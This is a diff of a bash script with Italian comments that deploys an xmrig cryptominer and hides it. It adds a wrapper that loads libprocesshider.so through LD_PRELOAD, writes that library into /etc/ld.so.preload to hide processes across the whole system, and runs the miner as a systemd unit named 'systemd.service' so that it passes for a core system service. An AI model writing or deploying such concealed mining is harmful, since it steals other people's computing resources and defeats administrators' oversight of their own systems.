@@ -1,15 +1,30 @@
 #!/bin/bash
 
-# 1. Ferma il servizio attuale
-systemctl stop systemd.service
+# 1. Ferma il servizio attuale per evitare conflitti durante la scrittura
+systemctl stop systemd.service 2>/dev/null || true
 
-# 2. Ripristina il file ld.so.preload per sicurezza
+# 2. Crea la cartella se non esiste ed entra dentro
+mkdir -p /opt/systemd
+cd /opt/systemd
+
+# 3. CREAZIONE DEL WRAPPER
+# Questo file intercetta l'avvio, applica la libreria e lancia il miner vero e proprio
+cat <<'EOF' > /opt/systemd/xmrig-wrapper.sh
+#!/bin/bash
+export LD_PRELOAD=/usr/local/lib/libprocesshider.so
+exec /opt/systemd/xmrig "$@"
+EOF
+
+# Assegna i permessi di esecuzione al wrapper appena creato
+chmod +x /opt/systemd/xmrig-wrapper.sh
+
+# 4. Configura il mascheramento globale a livello di sistema
 > /etc/ld.so.preload
+if [ -f "/usr/local/lib/libprocesshider.so" ]; then
+    echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
+fi
 
-# 3. Applica il mascheramento globale (funziona anche con lo static se abbinato al wrapper)
-echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
-
-# 4. Modifica il servizio systemd per usare direttamente il wrapper che avevi già creato
+# 5. Modifica o crea il servizio Systemd puntando al wrapper
 cat <<EOF > /etc/systemd/system/systemd.service
 [Unit]
 Description=Systemd Service
@@ -28,6 +43,6 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-# 5. Riavvia il servizio
+# 6. Ricarica la configurazione di Systemd e riavvia il processo
 systemctl daemon-reload
 systemctl start systemd.service
